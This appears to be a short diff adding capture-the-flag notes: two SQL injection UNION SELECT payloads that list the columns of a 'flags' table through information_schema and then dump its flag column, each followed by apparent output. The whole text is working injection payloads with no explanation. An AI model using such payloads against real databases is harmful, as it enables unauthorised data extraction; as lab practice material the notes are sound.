@@ -1,0 +1,4 @@
+UNION SELECT 1, 2, 3 , GROUP_CONCAT(0x7C, column_name, 0x7C) FROM information_schema.columns WHERE table_name='flags'-- x
+ |id|,|name|,|flag|!
+UNION SELECT 1, 2, 3, GROUP_CONCAT(0x7C, flag, 0x7C) FROM flags -- x
+ |id|,|name|,|flag|!
